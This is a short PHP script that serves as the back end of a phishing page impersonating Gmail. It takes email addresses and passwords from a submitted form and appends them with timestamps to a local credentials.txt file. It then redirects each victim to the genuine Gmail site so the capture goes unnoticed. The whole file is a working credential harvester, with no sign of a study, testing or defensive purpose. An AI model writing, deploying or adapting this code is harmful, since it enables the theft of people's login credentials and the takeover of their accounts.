<?php
// Define the local file to save data
$log_file = "credentials.txt";

// Check if form was submitted via POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Retrieve and sanitize the data
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    
    // Create a data string with a timestamp
    $timestamp = date("Y-m-d H:i:s");
    $entry = "[$timestamp] Email: $email | Password: $password" . PHP_EOL;
    
    // Save to the file locally
    // FILE_APPEND ensures new entries don't delete old ones
    if (file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX)) {
        // Redirect to actual Gmail after saving
        header("Location: https://mail.google.com");
        exit();
    } else {
        echo "Error saving credentials. Check folder permissions.";
    }
} else {
    // Redirect back to index.html if accessed directly
    header("Location: index.html");
    exit();
}
?>
